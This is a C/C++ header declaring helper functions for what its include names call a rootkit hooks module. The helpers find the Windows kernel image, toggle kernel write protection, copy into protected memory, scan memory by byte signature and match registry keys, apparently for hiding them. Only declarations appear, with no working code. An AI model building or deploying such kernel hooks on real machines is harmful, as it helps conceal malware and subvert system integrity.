#pragma once
#include "../stdafx.h"
#include "../Structs/Structs.h"
#include "../RootkitHooksConfig.h"

BOOLEAN GetNtoskrnl(ULONG_PTR* kernelBase, SIZE_T* kernelSize);

NTSTATUS SuperCopyMemory(
    IN VOID UNALIGNED* Destination,
    IN CONST VOID UNALIGNED* Source,
    IN ULONG Length);

KIRQL WPOFFx64();

void WPONx64(KIRQL irql);

NTSTATUS GetKeyName(HANDLE keyHandle, PKEY_NAME_INFORMATION* keyNameInfo);

NTSTATUS CheckReqForMatchRegisterInList(HANDLE keyHandle, OUT RegistryKey& key);

BOOL wstrnotnull(WSTRING str, WSTRING substr);

void PrintNonullStr(PWCHAR buffer, ULONGLONG length);

ULONG_PTR findBySignature(PBYTE baseAddres, SIZE_T baseLenght, PBYTE pattern, SIZE_T patternLenght);
